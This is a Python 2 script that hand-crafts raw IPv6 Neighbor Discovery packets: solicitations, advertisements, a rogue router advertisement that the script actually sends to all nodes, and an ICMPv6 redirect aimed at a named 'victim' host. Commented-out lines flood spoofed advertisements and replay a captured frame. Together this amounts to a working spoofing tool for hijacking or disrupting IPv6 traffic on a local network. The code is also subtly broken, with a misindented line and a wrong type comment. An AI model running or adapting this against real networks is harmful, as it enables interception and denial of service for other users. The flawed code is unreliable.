import net_helper_ipv6 as nh6
import helper_functions as hf
import netaddr_convert as nac
import struct

def ipv6_solicitation(ipv6_src_addr, ipv6_target_addr):

  dst = "\x33\x33\x00\x00\x00\x01" # dst mac
  src = hf.get_my_mac() # src mac
  htype = "\x86\xdd" # type 

  etherhdr = dst + src + htype


  ipv6solicit  = "\x87" # type = 135
  ipv6solicit += "\x00" # code = 0
  ipv6solicit += "\x00" * 2 # chksum
  ipv6solicit += "\x00" * 4 # reserved = 0 (32-bit)
  ipv6solicit += hf.ipv6_str_to_bin(ipv6_target_addr) # target address
  # BEGIN OPTIONS
  ipv6solicit += "\x01" # type 1 = source link layer addr
  ipv6solicit += "\x01" # length in number of 8 octet groups
  ipv6solicit += hf.get_my_mac() # link layer addr

  ipv6hdr  = "\x60\x00\x00\x00" # version 6, traffic class, flow label
  ipv6hdr += struct.pack('>H', len(ipv6solicit)) # payload length = 32
  ipv6hdr += "\x3a" # Next Header = 58 (ICMPv6)
  ipv6hdr += "\xff" # Hop Limit   = 255
  ipv6hdr += hf.ipv6_str_to_bin(ipv6_src_addr) # src ipv6 addr
  ipv6hdr += hf.ipv6_str_to_bin(ipv6_target_addr) # target ipv6 addr


 nh6.rawsend_cksum(etherhdr + ipv6hdr + ipv6solicit, dev="eth0")



def ipv6_advertisement(ipv6_src_addr, ipv6_target_addr):

  dst = "\x33\x33\x00\x00\x00\x01" # dst mac
  src = hf.get_my_mac() # src mac
  htype = "\x86\xdd" # type 

  etherhdr = dst + src + htype


  ipv6adver  = "\x88" # type = 136
  ipv6adver += "\x00" # code = 0
  ipv6adver += "\x00" * 2 # chksum
  ipv6adver += "\xe0\x00\x00\x00" # Router, Sol, Override flags + reserved = 0 (32-bit total)
  ipv6adver += hf.ipv6_str_to_bin(ipv6_target_addr)

  # BEGIN OPTIONS
  ipv6advertopts  = "\x01" # type 1 = source link layer addr
  ipv6advertopts += "\x01" # length in number of 8 octet groups
  ipv6advertopts += hf.get_my_mac() # link layer addr

  ipv6adver += ipv6advertopts

  ipv6hdr  = "\x60\x00\x00\x00" # version 6, traffic class, flow label
  ipv6hdr += struct.pack('>H', len(ipv6adver)) # payload length = 32
  ipv6hdr += "\x3a" # Next Header = 58 (ICMPv6)
  ipv6hdr += "\xff" # Hop Limit   = 255
  ipv6hdr += hf.ipv6_str_to_bin(ipv6_src_addr) # src ipv6 addr
  ipv6hdr += hf.ipv6_str_to_bin(ipv6_target_addr) # target ipv6 addr


  nh6.rawsend_cksum(etherhdr + ipv6hdr + ipv6adver, dev="eth0")




def ipv6_router_advertisement(ipv6_net_id, ipv6_src_addr, ipv6_target_addr):

  dst = "\x33\x33\x00\x00\x00\x01" # dst mac
  src = hf.get_my_mac() # src mac
  htype = "\x86\xdd" # type 
  
  etherhdr = dst + src + htype

  #ROUTER ADVERTISEMENT ############################ 

  ipv6rtradv  = "\x86" # type = 134 (router advertisment)
  ipv6rtradv += "\x00" # code = 0
  ipv6rtradv += "\x00" * 2 # chksum 
  ipv6rtradv += "\xff" # cur hop limit
  ipv6rtradv += "\x00" # m-flag (1-bit), o-flag (1-bit), reserved (6-bits)
  ipv6rtradv += "\x1c\x20" # Router Lifetime (s)
  ipv6rtradv += "\xff" *4  # Reachable Time
  ipv6rtradv += "\x00" *4  # Retransmit Timer

  # PREFIX OPTIONS
  prefixinfo  = "\x03" # type = 3 (Prefix information)
  prefixinfo += "\x04" # length in number of 8 octet groups
  prefixinfo += "\x40" # CIDR (ox40 == 64)
  prefixinfo += "\xe0" # l-flag(1-bit), a-flag (1-bit), reserved (6-bits)
  prefixinfo += "\x00\x00\x1c\x20" # Valid Lifetime (4-byte)    
  prefixinfo += "\x00\x00\x1c\x20" # Preferred Lifetime (4-byte) 
  prefixinfo += "\x00" * 4 # reserved2
  prefixinfo += hf.ipv6_str_to_bin(ipv6_net_id)

  # BEGIN OPTIONS 2
  ipv6opts  = "\x01" # type 1 = source link layer addr
  ipv6opts += "\x01" # length in number of 8 octet groups
  ipv6opts += hf.get_my_mac() # link layer addr

  # ROUTER ADVERTISEMENT + ALL OPTIONS
  ipv6rtradv += ipv6opts + prefixinfo 
 
  
  ##################################################

  ipv6hdr  = "\x60\x00\x00\x00" # version 6, traffic class, flow label
  ipv6hdr += struct.pack('>H', len(ipv6rtradv)) # payload length = 56
  ipv6hdr += "\x3a" # Next Header = 58 (ICMPv6)
  ipv6hdr += "\xff" # Hop Limit   = 255
  ipv6hdr += hf.ipv6_str_to_bin(ipv6_src_addr) # src ipv6 addr
  ipv6hdr += hf.ipv6_str_to_bin(ipv6_target_addr) # target ipv6 addr
  

  nh6.rawsend_cksum(etherhdr + ipv6hdr + ipv6rtradv, dev="eth0")


def ipv6_redirect(ipv6_src_addr, ipv6_new_dest_addr, new_dest_mac, victim_mac, ipv6_victim_addr):

  dst = hf.mac_str_to_hex(victim_mac) # dst mac
  src = hf.get_my_mac() # src mac
  htype = "\x86\xdd" # type 
  
  etherhdr = dst + src + htype


  # REDIRECT
  ipv6redirect  = "\x89"  # type = 3 (REDIRECT)
  ipv6redirect += "\x00" # code = 0
  ipv6redirect += "\x00" * 2 # checksum
  ipv6redirect += "\x00" * 4 # RESERVED
  ipv6redirect += hf.ipv6_str_to_bin(ipv6_new_dest_addr) # Target Addr
  ipv6redirect += hf.ipv6_str_to_bin(ipv6_src_addr) # Dest Addr

  # REDIRECT OPTS
  rediropts  = "\x01" # type 1 = source link layer addr
  rediropts += "\x01" # length in number of 8 octet groups
  rediropts +=  hf.mac_str_to_hex(new_dest_mac) # link layer addr
  

  ipv6redirect += rediropts

 
  ipv6hdr  = "\x60\x00\x00\x00" # version 6, traffic class, flow label
  ipv6hdr += struct.pack('>H', len(ipv6redirect)) # payload length = 56
  ipv6hdr += "\x3a" # Next Header = 58 (ICMPv6)
  ipv6hdr += "\xff" # Hop Limit   = 255
  ipv6hdr += hf.ipv6_str_to_bin(ipv6_src_addr) # src ipv6 addr
  ipv6hdr += hf.ipv6_str_to_bin(ipv6_victim_addr) # target ipv6 addr

  nh6.rawsend_cksum(etherhdr + ipv6hdr + ipv6redirect, dev="eth0")


#ipv6_solicitation("a:c:7:9:c17f:df95:8383:3df7", "a:c:7:9::69")


#for x in xrange(1,200,1): ipv6_advertisement("a:c:7:9:c17f:df95:8383:3df7", "ff02::1")


ipv6_router_advertisement("5:5:5:4::", "fe80::20c:29ff:fe85:6c41", "ff02::1")


#ipv6_redirect("a:c:7:9:ecfc:96ca:8294:5ec0", #my ip
#              "a:c:7:9::69", #stephen ip
#              "00:0c:29:d3:dc:d4", #stephen mac
#              "50:9a:4c:47:a8:41", #victim mac
#              "a:c:7:9:a834:825f:1b62:b613") #victim ip




"""
frame = "\x00\x0c\x29\x81\x8f\x40\x00\x0c\x29\x78\xec\x6a\x08\x00\x45\x00\x00\x54\x49\xb7\x40\x00\x40\x01\x97\x66\xac\x10\x00\xa4\xac\x10\x00\xc7\x08\x00\x6b\xb3\x15\xc6\x00\x01\x51\x74\x22\x5b\x00\x00\x00\x00\x3c\xe3\x07\x00\x00\x00\x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37"

nh6.rawsend(frame)





frame1 = "\x33\x33\x00\x01\x00\x02\x50\x9a\x4c\x47\xa6\xf4\x86\xdd\x60\x00" \
"\x00\x00\x00\x67\x11\x01\xfe\x80\x00\x00\x00\x00\x00\x00\xe0\xa8" \
"\xbc\x30\x16\xe9\xb3\x06\xff\x02\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x01\x00\x02\x02\x22\x02\x23\x00\x67\xc3\xd0\x01\x51" \
"\x7a\x7e\x00\x08\x00\x02\x05\xdd\x00\x01\x00\x0e\x00\x01\x00\x01" \
"\x23\x17\x1c\x2f\x50\x9a\x4c\x47\xa6\xf4\x00\x03\x00\x0c\x11\x50" \
"\x9a\x4c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x27\x00\x11\x00\x0f" \
"\x44\x45\x53\x4b\x54\x4f\x50\x2d\x37\x48\x4b\x56\x33\x54\x51\x00" \
"\x10\x00\x0e\x00\x00\x01\x37\x00\x08\x4d\x53\x46\x54\x20\x35\x2e" \
"\x30\x00\x06\x00\x08\x00\x11\x00\x17\x00\x18\x00\x27"


for x in xrange(100):
  nh6.rawsend(frame1)
"""
